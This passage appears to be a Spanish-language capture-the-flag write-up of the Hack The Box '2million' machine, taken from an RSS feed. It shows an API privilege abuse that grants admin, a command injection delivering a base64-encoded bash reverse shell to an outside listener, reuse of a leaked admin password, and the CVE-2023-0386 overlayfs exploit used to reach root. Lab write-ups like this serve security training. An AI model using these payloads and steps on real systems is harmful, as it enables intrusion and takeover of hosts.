        &quot;/api/v1/user/vpn/download&quot;: &quot;Download OVPN file&quot;
      },
      &quot;POST&quot;: {
        &quot;/api/v1/user/register&quot;: &quot;Register a new user&quot;,
        &quot;/api/v1/user/login&quot;: &quot;Login with existing user&quot;
      }
    },
    &quot;admin&quot;: {
      &quot;GET&quot;: {
        &quot;/api/v1/admin/auth&quot;: &quot;Check if user is admin&quot;
      },
      &quot;POST&quot;: {
        &quot;/api/v1/admin/vpn/generate&quot;: &quot;Generate VPN for specific user&quot;
      },
      &quot;PUT&quot;: {
        &quot;/api/v1/admin/settings/update&quot;: &quot;Update user settings&quot;
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Change my user settings&lt;/h3&gt;
&lt;p&gt;Cambiamos nuestra configuración de usuario:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -sXPUT http://2million.htb/api/v1/admin/settings/update -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; -H &apos;Content-Type: application/json&apos; -d &apos;{&quot;email&quot;: &quot;mhil4ne@gmail.com&quot;, &quot;is_admin&quot;: 1}&apos; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora que somos el usuario admin, podemos inyectar comandos a través del parámetro username.&lt;/p&gt;
&lt;h3&gt;RevShell (www-data)&lt;/h3&gt;
&lt;p&gt;Preparamos nuestro revShell y lo pasamos en Base64:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -sXPOST http://2million.htb/api/v1/admin/vpn/generate -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; -H &apos;Content-Type: application/json&apos; -d &apos;{&quot;username&quot;:&quot;mhil4ne;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1MC80NDMgMD4mMQo=| base64 -d | bash&quot;}&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 443
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&quot;img/7.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;find .env:&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;img/8.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;Mira el archivo /etc/passwd:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin1000:1000::/home/admin:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;admin user credentials&lt;/h3&gt;
&lt;p&gt;Pruebe la contraseña con este usuario:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin : SuperDuperPass123
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;CVE-2023-0386&lt;/h3&gt;
&lt;p&gt;Lo llevamos a nuestra máquina de ataque:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;svn checkout https://github.com/DataDog/security-labs-pocs/trunk/proof-of-concept-exploits/overlayfs-cve-2023-0386
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compilamos el archivo:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Install libfuse-dev&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -lpthread
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pasas el archivo a la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# From the victim machine
nc -nlvp 1222 &amp;gt; poc
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# From the attacking machine
nc 10.10.11.221 1234 &amp;lt; poc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora le damos permisos de ejecución:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x poc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lo ejecutamos&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./poc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora eres Root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@2million:~# whoami
root
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item></channel></rss>